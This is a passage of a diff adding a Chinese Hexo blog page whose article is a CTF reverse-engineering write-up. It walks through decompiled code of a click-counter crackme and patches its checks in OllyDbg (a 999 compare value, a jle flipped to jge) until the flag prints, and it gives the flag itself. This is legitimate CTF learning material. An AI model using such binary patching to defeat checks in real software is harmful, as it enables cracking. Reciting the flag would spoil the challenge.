+    result = sub_4015FE(v1);
+  if ( dword_4A32C0 == 1000 )
+  {
+    result = sub_401323();
+    dword_4A32C0 = 0;
+  }
+  return result;
+}
+</code></pre>
+<p>从代码我们可以猜到</p>
+<pre class=" language-lang-c"><code class="language-lang-c">dword_4A32C0 == 1000
+</code></pre>
+<p>这个就是判断的条件</p>
+<p>那么这个</p>
+<pre class=" language-lang-c"><code class="language-lang-c">sub_401323()
+</code></pre>
+<p>是干什么的呢？</p>
+<p>跟进去看看</p>
+<pre class=" language-lang-c"><code class="language-lang-c">int sub_401323()
+{
+  int result; // eax@13
+  char v1; // al@16
+  void *lpMem; // [sp+4h] [bp-8h]@16
+
+  if ( dword_4A32C4 == 1 )
+    sub_4015F2(2, 1);
+  if ( dword_4A32C4 == 2 )
+    sub_4015F2(2, 1);
+  if ( dword_4A32C4 == 3 )
+    sub_4015F2(2, 1);
+  if ( dword_4A32C4 == 4 )
+    sub_4015F2(2, 1);
+  if ( dword_4A32C4 == 5 )
+    sub_4015F2(2, 1);
+  result = dword_4A32C4 > 5 && dword_4A32C4 < 18;//不难发现这个是判断flag{}括号里的字符数的
+  if ( result )
+  {
+    v1 = sub_4015F2(2, 1);
+    lpMem = (void *)sub_4015F2(1, v1);
+    result = sub_4015F2(2, 1);
+    if ( lpMem )
+      result = sub_4015FE(lpMem);
+  }
+  if ( dword_4A32C4 == 18 )
+    result = sub_4015F2(2, 1);
+  if ( dword_4A32C4 > 10 ) //这个函数是把flag给变成*****的
+    result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);
+  ++dword_4A32C4;
+  return result;
+}
+</code></pre>
+<p>说实话一开始真没看懂，等到我用OD做出</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{55381
+</code></pre>
+<p>我才知道这个函数是干什么的</p>
+<p>找到函数的判断点后,进入OD调试</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">text:00401300                 cmp     dword_4A32C0, 3E8h
+</code></pre>
+<p>看到判断位置，下断点，右键将数值修改为3E7（也就是999），然后在点击一下</p>
+<p>就会出来一个flag字符</p>
+<p>但当字符数达到10个以上的时候flag就会变成<em>*</em></p>
+<p>猜测</p>
+<pre class=" language-lang-c"><code class="language-lang-c">  if ( dword_4A32C4 > 10 ) //这个函数是把flag给变成*****的
+    result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);
+  ++dword_4A32C4;
+</code></pre>
+<p>是这个函数的作用，找到汇编代码，把</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">.text:00401549                 jle     loc_40156C
+</code></pre>
+<p>修改为</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">.text:00401549                 jge     loc_40156C
+</code></pre>
+<p>也就是把判断条件改为了</p>
+<pre class=" language-lang-c"><code class="language-lang-c">dword_4A32C4 < 10
+</code></pre>
+<p>因为现在我们的字符数已经大于10了，所以</p>
+<pre class=" language-lang-c"><code class="language-lang-c">result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);
+</code></pre>
+<p>这个函数就不会在运行</p>
+<p>再按之前的操作走一遍</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">flag{5538189634510}
+</code></pre>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="https://180CM55KG.github.io" class="b-link-green">F0und</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2019/11/18/ctf/web/cdusec-ctf/" class="b-link-green">成都大学第二届“玄武杯”做题记录</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/11/19/ctf/pwn/cdusec-ctf2/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="成都大学第二届“玄武杯”做题记录2">
+                        
+                        <span class="card-title">成都大学第二届“玄武杯”做题记录2</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">第三部分 Pwn本次pwn就一道题，也不难，但也是我第一次做pwn…
+shell拿到题目，IDA走一下（64位）
+int __cdecl main(int argc, const char **argv, const char **envp</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-18
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                    <a href="/tags/misc/" target="_blank">
+                        <span class="chip bg-color">misc</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/11/08/go-web/go-web/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="go-web">
+                        
+                        <span class="card-title">go-web</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">第一章 Go与 Web 应用1.1 使用Go 语言构建Web 应用​    “为什么要使用Go语言编写web应用”，Go作为一门比较年轻的编程语言，个人认为比较符合现代发展的趋势，它非常适合用来编写那些需要快速运行的服务器端程序。Go语言提</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-08
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Go-web/" class="post-category" target="_blank">
+                                    Go-web
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Go/" target="_blank">
+                        <span class="chip bg-color">Go</span>
+                    </a>
+                    
+                    <a href="/tags/web/" target="_blank">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/后端/" target="_blank">
+                        <span class="chip bg-color">后端</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">29.4k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/180CM55KG/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1845477611@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1845477611" class="tooltipped" data-tooltip="QQ联系我: 1845477611" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
